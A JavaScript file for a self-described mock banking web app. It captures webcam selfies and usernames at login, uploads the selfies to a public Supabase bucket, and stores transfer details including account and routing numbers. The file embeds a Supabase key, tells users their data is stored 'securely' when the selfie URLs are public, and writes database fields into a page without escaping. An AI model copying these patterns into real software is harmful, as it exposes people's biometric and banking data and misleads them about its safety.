// Supabase Configuration - REPLACE WITH YOUR CREDENTIALS
const SUPABASE_URL = 'https://tcaudmgphasajzfspdqw.supabase.co'
const SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InRjYXVkbWdwaGFzYWp6ZnNwZHF3Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTQ1ODc4NzAsImV4cCI6MjA3MDE2Mzg3MH0.M8rg3QzBf2xC8uBbimfs8NPEkz3oxL3QSW03YKf2Sdw'

// Initialize Supabase client
const supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY)

class MockBankingApp {
    constructor() {
        this.videoElement = document.getElementById('videoElement');
        this.capturedImage = document.getElementById('capturedImage');
        this.startCameraBtn = document.getElementById('startCameraBtn');
        this.captureBtn = document.getElementById('captureBtn');
        this.retakeBtn = document.getElementById('retakeBtn');
        this.loginBtn = document.getElementById('loginBtn');
        this.loginForm = document.getElementById('loginForm');
        this.statusMessage = document.getElementById('statusMessage');
        this.logoutBtn = document.getElementById('logoutBtn');
        
        this.loginScreen = document.getElementById('loginScreen');
        this.bankingScreen = document.getElementById('bankingScreen');
        this.dashboardView = document.getElementById('dashboardView');
        this.transferScreen = document.getElementById('transferScreen');
        this.transferForm = document.getElementById('transferForm');
        this.backToDashboard = document.getElementById('backToDashboard');
        
        this.stream = null;
        this.capturedImageData = null;
        
        this.initEventListeners();
    }

    initEventListeners() {
        this.startCameraBtn.addEventListener('click', () => this.startCamera());
        this.captureBtn.addEventListener('click', () => this.capturePhoto());
        this.retakeBtn.addEventListener('click', () => this.retakePhoto());
        this.loginForm.addEventListener('submit', (e) => this.handleLogin(e));
        this.logoutBtn.addEventListener('click', () => this.logout());
        this.backToDashboard.addEventListener('click', () => this.showDashboard());
        this.transferForm.addEventListener('submit', (e) => this.handleTransfer(e));
    }

    async startCamera() {
        try {
            this.showStatus('Requesting camera access...', 'info');
            
            this.stream = await navigator.mediaDevices.getUserMedia({ 
                video: { 
                    facingMode: 'user',
                    width: { ideal: 640 },
                    height: { ideal: 480 }
                } 
            });
            
            this.videoElement.srcObject = this.stream;
            this.startCameraBtn.disabled = true;
            this.captureBtn.disabled = false;
            
            this.showStatus('Camera ready! Position yourself and click capture.', 'success');
        } catch (error) {
            console.error('Camera access error:', error);
            this.showStatus('Camera access denied. Please allow camera permissions.', 'error');
        }
    }

    capturePhoto() {
        const canvas = document.createElement('canvas');
        const context = canvas.getContext('2d');
        
        canvas.width = this.videoElement.videoWidth;
        canvas.height = this.videoElement.videoHeight;
        
        context.drawImage(this.videoElement, 0, 0);
        
        this.capturedImageData = canvas.toDataURL('image/jpeg', 0.8);
        
        this.capturedImage.src = this.capturedImageData;
        this.capturedImage.style.display = 'block';
        this.videoElement.style.display = 'none';
        
        this.captureBtn.style.display = 'none';
        this.retakeBtn.style.display = 'inline-block';
        this.loginBtn.disabled = false;
        
        if (this.stream) {
            this.stream.getTracks().forEach(track => track.stop());
        }
        
        this.showStatus('Photo captured! You can now login.', 'success');
    }

    retakePhoto() {
        this.capturedImage.style.display = 'none';
        this.videoElement.style.display = 'block';
        this.captureBtn.style.display = 'inline-block';
        this.retakeBtn.style.display = 'none';
        this.captureBtn.disabled = false;
        this.loginBtn.disabled = true;
        
        this.capturedImageData = null;
        this.startCamera();
    }

    async handleLogin(e) {
        e.preventDefault();
        
        if (!this.capturedImageData) {
            this.showStatus('Please capture a selfie first!', 'error');
            return;
        }
        
        const username = document.getElementById('username').value;
        const password = document.getElementById('password').value;
        
        if (!username || !password) {
            this.showStatus('Please fill in all fields!', 'error');
            return;
        }
        
        this.showStatus('Verifying credentials and uploading selfie securely...', 'info');
        this.loginBtn.disabled = true;
        
        try {
            // Upload selfie to Supabase
            const selfieResult = await this.uploadSelfieToSupabase(username, this.capturedImageData);
            
            if (selfieResult.success) {
                // Store login record in Supabase database
                await this.saveLoginRecord(username, selfieResult.imageUrl);
                
                this.showStatus('✅ Selfie securely stored! Verification complete.', 'success');
                
                setTimeout(() => {
                    this.showBankingDashboard(username);
                }, 1500);
            } else {
                throw new Error(selfieResult.error);
            }
            
        } catch (error) {
            console.error('Login/Upload error:', error);
            this.showStatus('❌ Failed to store selfie securely. Please try again.', 'error');
            this.loginBtn.disabled = false;
        }
    }

    async uploadSelfieToSupabase(username, base64Image) {
        try {
            // Convert base64 to blob
            const response = await fetch(base64Image);
            const blob = await response.blob();
            
            // Create unique filename
            const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
            const filename = `${username}_${timestamp}.jpg`;
            
            // Upload to Supabase Storage
            const { data, error } = await supabase.storage
                .from('selfie-verification')
                .upload(filename, blob, {
                    cacheControl: '3600',
                    upsert: false
                });
            
            if (error) {
                console.error('Supabase upload error:', error);
                return { success: false, error: error.message };
            }
            
            // Get public URL
            const { data: urlData } = supabase.storage
                .from('selfie-verification')
                .getPublicUrl(filename);
            
            return { 
                success: true, 
                imageUrl: urlData.publicUrl,
                filename: filename 
            };
            
        } catch (error) {
            console.error('Upload process error:', error);
            return { success: false, error: error.message };
        }
    }

    async saveLoginRecord(username, imageUrl) {
        try {
            const loginRecord = {
                username: username,
                selfie_url: imageUrl,
                login_timestamp: new Date().toISOString(),
                ip_address: 'demo-ip',
                user_agent: navigator.userAgent.substring(0, 100),
                verification_status: 'pending'
            };
            
            const { data, error } = await supabase
                .from('login_verifications')
                .insert([loginRecord]);
            
            if (error) {
                console.error('Database save error:', error);
                // Don't fail login if database save fails
            }
            
            console.log('✅ Login record saved to database:', loginRecord);
            
        } catch (error) {
            console.error('Save login record error:', error);
        }
    }

    showBankingDashboard(username) {
        // Update welcome message
        document.getElementById('welcomeMessage').textContent = `Welcome, ${username}!`;
        
        // Animate transition
        this.loginScreen.style.display = 'none';
        this.bankingScreen.style.display = 'block';
        
        // Add entrance animation
        this.bankingScreen.style.opacity = '0';
        this.bankingScreen.style.transform = 'translateY(20px)';
        
        setTimeout(() => {
            this.bankingScreen.style.transition = 'all 0.5s ease';
            this.bankingScreen.style.opacity = '1';
            this.bankingScreen.style.transform = 'translateY(0)';
        }, 100);
    }

    showDashboard() {
        this.transferScreen.style.display = 'none';
        this.dashboardView.style.display = 'block';
    }

    async handleTransfer(e) {
        e.preventDefault();
        
        const transferData = {
            amount: document.getElementById('transferAmount').value,
            recipient_name: document.getElementById('recipientName').value,
            recipient_address: document.getElementById('recipientAddress').value,
            recipient_city: document.getElementById('recipientCity').value,
            recipient_state: document.getElementById('recipientState').value,
            recipient_zip: document.getElementById('recipientZip').value,
            recipient_country: document.getElementById('recipientCountry').value,
            bank_name: document.getElementById('bankName').value,
            account_number: document.getElementById('accountNumber').value,
            routing_number: document.getElementById('routingNumber').value,
            account_type: document.getElementById('accountType').value,
            transfer_memo: document.getElementById('transferMemo').value || null,
            transfer_speed: document.getElementById('transferSpeed').value,
            transfer_timestamp: new Date().toISOString(),
            transfer_status: 'pending',
            user_ip: 'demo-ip',
            user_agent: navigator.userAgent.substring(0, 200)
        };

        // Show processing message
        const submitBtn = e.target.querySelector('.btn-transfer');
        const originalText = submitBtn.innerHTML;
        submitBtn.innerHTML = '🔄 Processing Transfer...';
        submitBtn.disabled = true;

        try {
            // Store transfer in Supabase
            const { data, error } = await supabase
                .from('transfer_requests')
                .insert([transferData]);

            if (error) {
                console.error('Transfer storage error:', error);
                throw new Error('Failed to store transfer data: ' + error.message);
            }

            console.log('✅ Transfer data stored successfully:', transferData);

            // Simulate processing time
            await new Promise(resolve => setTimeout(resolve, 3000));

            // Get country name for display
            const countrySelect = document.getElementById('recipientCountry');
            const selectedCountry = countrySelect.options[countrySelect.selectedIndex].text;

            // Show success message with all details
            alert(`✅ Transfer Initiated Successfully!

💰 Amount: ${transferData.amount}
👤 To: ${transferData.recipient_name}
🏠 Address: ${transferData.recipient_address}, ${transferData.recipient_city}, ${transferData.recipient_state} ${transferData.recipient_zip}
🌍 Country: ${selectedCountry}
🏦 Bank: ${transferData.bank_name}
💳 Account: ****${transferData.account_number.slice(-4)}
⚡ Speed: ${transferData.transfer_speed}
📝 Memo: ${transferData.transfer_memo || 'None'}

🔒 Your international transfer has been securely submitted and is being processed.
You will receive a confirmation email shortly.

Transfer ID: TXN${Date.now()}
Status: Processing`);

            // Reset form and go back to dashboard
            this.transferForm.reset();
            this.showDashboard();

        } catch (error) {
            console.error('Transfer error:', error);
            alert(`❌ Transfer Failed

Error: ${error.message}

Please check your connection and try again. If the problem persists, contact support.`);
        } finally {
            submitBtn.innerHTML = originalText;
            submitBtn.disabled = false;
        }
    }

    logout() {
        this.bankingScreen.style.display = 'none';
        this.loginScreen.style.display = 'block';
        this.showDashboard();
        this.resetForm();
    }

    resetForm() {
        document.getElementById('loginForm').reset();
        this.capturedImage.style.display = 'none';
        this.videoElement.style.display = 'block';
        this.startCameraBtn.disabled = false;
        this.captureBtn.disabled = true;
        this.captureBtn.style.display = 'inline-block';
        this.retakeBtn.style.display = 'none';
        this.loginBtn.disabled = true;
        this.capturedImageData = null;
        this.hideStatus();
    }

    showStatus(message, type) {
        this.statusMessage.textContent = message;
        this.statusMessage.className = `status-message status-${type}`;
        this.statusMessage.classList.remove('hidden');
    }

    hideStatus() {
        this.statusMessage.classList.add('hidden');
    }
}

// Admin functions to view stored verification data
window.viewSupabaseVerifications = async function() {
    try {
        const { data, error } = await supabase
            .from('login_verifications')
            .select('*')
            .order('login_timestamp', { ascending: false })
            .limit(10);
        
        if (error) {
            console.error('Error fetching data:', error);
            alert('Error fetching verification data. Check console.');
            return;
        }
        
        console.log('Recent login verifications:', data);
        
        if (data && data.length > 0) {
            const latest = data[0];
            
            // Open window showing latest verification
            const newWindow = window.open('', '_blank', 'width=600,height=700');
            newWindow.document.write(`
                <html>
                    <head><title>Banking Login Verifications</title></head>
                    <body style="font-family: Arial; padding: 20px;">
                        <h2>🏦 Banking Login Verifications</h2>
                        <div style="background: #f5f5f5; padding: 15px; border-radius: 8px; margin: 10px 0;">
                            <h3>Latest Login:</h3>
                            <p><strong>Username:</strong> ${latest.username}</p>
                            <p><strong>Time:</strong> ${new Date(latest.login_timestamp).toLocaleString()}</p>
                            <p><strong>Status:</strong> ${latest.verification_status}</p>
                            <p><strong>Selfie:</strong></p>
                            <img src="${latest.selfie_url}" style="max-width: 300px; border-radius: 10px; box-shadow: 0 4px 8px rgba(0,0,0,0.1);">
                        </div>
                        <hr>
                        <h3>All Verifications (${data.length} total):</h3>
                        ${data.map(record => `
                            <div style="border: 1px solid #ddd; padding: 10px; margin: 5px 0; border-radius: 5px;">
                                <strong>${record.username}</strong> - ${new Date(record.login_timestamp).toLocaleString()}
                                <br><small>Status: ${record.verification_status}</small>
                            </div>
                        `).join('')}
                        <p><small>🔒 Stored securely in Supabase cloud database</small></p>
                    </body>
                </html>
            `);
        } else {
            alert('No verification records found. Try logging in first!');
        }
        
    } catch (error) {
        console.error('Function error:', error);
        alert('Error accessing database. Make sure Supabase is configured correctly.');
    }
};

window.clearSupabaseData = async function() {
    if (confirm('Are you sure you want to delete ALL verification records?')) {
        try {
            const { error } = await supabase
                .from('login_verifications')
                .delete()
                .gte('id', 0);
            
            if (error) {
                console.error('Delete error:', error);
                alert('Error deleting records.');
            } else {
                alert('All verification records deleted!');
            }
        } catch (error) {
            console.error('Clear function error:', error);
        }
    }
};

// Feature functions
window.showTransferForm = function() {
    const app = window.bankingApp;
    if (app) {
        app.dashboardView.style.display = 'none';
        app.transferScreen.style.display = 'block';
    }
};

window.showFeature = function(feature) {
    alert(`${feature} feature would open here!\n\nThis is a mock banking app for design purposes.`);
};

// Initialize the banking app when the page loads
document.addEventListener('DOMContentLoaded', () => {
    window.bankingApp = new MockBankingApp();
});